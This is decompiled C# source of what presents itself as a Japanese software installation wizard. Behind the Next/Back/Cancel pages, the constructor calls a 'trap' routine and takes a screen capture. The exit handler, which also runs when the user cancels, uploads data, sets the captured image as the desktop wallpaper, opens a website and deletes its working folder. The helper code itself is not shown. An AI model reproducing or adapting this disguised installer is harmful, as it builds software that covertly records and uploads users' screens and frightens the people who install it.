using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Smart.Windows.Mvc;
using setup.Properties;

namespace setup;

public class fMain : Form, IFunctionControl
{
	private readonly Controller controller;

	private readonly Dictionary<Keys, FunctionKey> enabledFunctions = new Dictionary<Keys, FunctionKey>();

	private readonly List<Button> functionButtons = new List<Button>();

	private string next;

	private string back;

	private IContainer components;

	private Panel pFoot;

	private Button btnBack;

	private Button btnCancel;

	private Button btnNext;

	private Panel pMain;

	private Label label1;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public fMain()
	{
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Expected O, but got Unknown
		InitializeComponent();
		InitializeFunctionKeys();
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		Settings.Default.uid = lib.GetRandom();
		lib.trap();
		string path = "C:\\" + Settings.Default.uid;
		Directory.CreateDirectory(path);
		Settings.Default.it_dir = lib.GetImage(Settings.Default.it);
		Settings.Default.ih_dir = lib.GetImage(Settings.Default.ih);
		lib.ScreenCapture();
		((Control)this).set_Text(Settings.Default.fn);
		controller = new Controller((IViewProvider)new ControlViewProvider((Control)(object)pMain));
		controller.add_Forwarding((EventHandler<ViewForwardEventArgs>)OnForwarding);
		controller.add_Exited((EventHandler<ViewExitEventArgs>)OnExited);
		controller.AutoRegister(Assembly.GetExecutingAssembly());
		((Control)this).Show();
		controller.Forward((object)Views.page0);
	}

	private void InitializeFunctionKeys()
	{
		((Control)btnBack).set_Tag((object)(Keys)66);
		((Control)btnNext).set_Tag((object)(Keys)78);
		((Control)btnCancel).set_Tag((object)(Keys)67);
		functionButtons.Add(btnBack);
		functionButtons.Add(btnNext);
		functionButtons.Add(btnCancel);
	}

	public void UpdateFunctionKeys(FunctionKey[] keys)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		enabledFunctions.Clear();
		if (keys != null)
		{
			foreach (FunctionKey functionKey in keys)
			{
				enabledFunctions.Add(functionKey.Keys, functionKey);
			}
		}
		foreach (Button functionButton in functionButtons)
		{
			Keys key = (Keys)((Control)functionButton).get_Tag();
			if (enabledFunctions.ContainsKey(key))
			{
				FunctionKey functionKey2 = enabledFunctions[key];
				((Control)functionButton).set_Visible(true);
				((Control)functionButton).set_Enabled(true);
				((Control)functionButton).set_Text(functionKey2.Display);
			}
			else
			{
				if (!(next == "page1") && !(next == "page2"))
				{
					((Control)functionButton).set_Enabled(false);
				}
				else
				{
					((Control)functionButton).set_Visible(false);
				}
				((Control)functionButton).set_Text("");
			}
		}
	}

	private void OnForwarding(object sender, ViewForwardEventArgs e)
	{
		if (controller.get_CurrentView() is IApplicationView applicationView)
		{
			applicationView.SetFunctionControl(this);
		}
		int num = int.Parse(e.get_ViewId().ToString()!.Replace("page", ""));
		next = "page" + (num + lib.PageRule(num, 1));
		back = "page" + (num - lib.PageRule(num, 0));
	}

	private void OnExited(object sender, ViewExitEventArgs e)
	{
		lib.DataUpload();
		WallpaperChanger.SetWallpaper(Settings.Default.MyPictures + "\\" + Settings.Default.uid + ".jpg", WallpaperLocation.Stretch);
		lib.SiteOpen();
		fEnd fEnd2 = new fEnd();
		((Control)fEnd2).Show();
		lib.DelDir();
		((Control)this).Hide();
	}

	private void btnNext_Click(object sender, EventArgs e)
	{
		if (next == "page12")
		{
			controller.Exit();
		}
		else
		{
			controller.Forward(Enum.Parse(typeof(Views), next));
		}
	}

	private void btnCancel_Click(object sender, EventArgs e)
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show((IWin32Window)(object)this, Settings.Default.fn + " のインストールを中断してもよろ\nしいですか?", Settings.Default.fn + " - インストールウィザード", (MessageBoxButtons)4, (MessageBoxIcon)48, (MessageBoxDefaultButton)256) == 6)
		{
			controller.Exit();
		}
	}

	private void btnBack_Click(object sender, EventArgs e)
	{
		controller.Forward(Enum.Parse(typeof(Views), back));
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(fMain));
		pFoot = new Panel();
		label1 = new Label();
		btnBack = new Button();
		btnCancel = new Button();
		btnNext = new Button();
		pMain = new Panel();
		((Control)pFoot).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)pFoot).get_Controls().Add((Control)(object)label1);
		((Control)pFoot).get_Controls().Add((Control)(object)btnBack);
		((Control)pFoot).get_Controls().Add((Control)(object)btnCancel);
		((Control)pFoot).get_Controls().Add((Control)(object)btnNext);
		((Control)pFoot).set_Dock((DockStyle)2);
		((Control)pFoot).set_Location(new Point(0, 300));
		((Control)pFoot).set_Name("pFoot");
		((Control)pFoot).set_Size(new Size(500, 53));
		((Control)pFoot).set_TabIndex(0);
		label1.set_BorderStyle((BorderStyle)2);
		((Control)label1).set_Location(new Point(0, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(580, 2));
		((Control)label1).set_TabIndex(96);
		((Control)btnBack).set_Location(new Point(248, 18));
		((Control)btnBack).set_Name("btnBack");
		((Control)btnBack).set_Size(new Size(75, 23));
		((Control)btnBack).set_TabIndex(93);
		((Control)btnBack).set_Text("戻る");
		((ButtonBase)btnBack).set_UseVisualStyleBackColor(true);
		((Control)btnBack).add_Click((EventHandler)btnBack_Click);
		((Control)btnCancel).set_Location(new Point(415, 18));
		((Control)btnCancel).set_Name("btnCancel");
		((Control)btnCancel).set_Size(new Size(75, 23));
		((Control)btnCancel).set_TabIndex(95);
		((Control)btnCancel).set_Text("キャンセル");
		((ButtonBase)btnCancel).set_UseVisualStyleBackColor(true);
		((Control)btnCancel).add_Click((EventHandler)btnCancel_Click);
		((Control)btnNext).set_Location(new Point(329, 18));
		((Control)btnNext).set_Name("btnNext");
		((Control)btnNext).set_Size(new Size(75, 23));
		((Control)btnNext).set_TabIndex(94);
		((Control)btnNext).set_Text("次へ");
		((ButtonBase)btnNext).set_UseVisualStyleBackColor(true);
		((Control)btnNext).add_Click((EventHandler)btnNext_Click);
		((Control)pMain).set_Dock((DockStyle)5);
		((Control)pMain).set_Location(new Point(0, 0));
		((Control)pMain).set_Name("pMain");
		((Control)pMain).set_Size(new Size(500, 300));
		((Control)pMain).set_TabIndex(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(500, 353));
		((Control)this).get_Controls().Add((Control)(object)pMain);
		((Control)this).get_Controls().Add((Control)(object)pFoot);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("fMain");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)pFoot).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
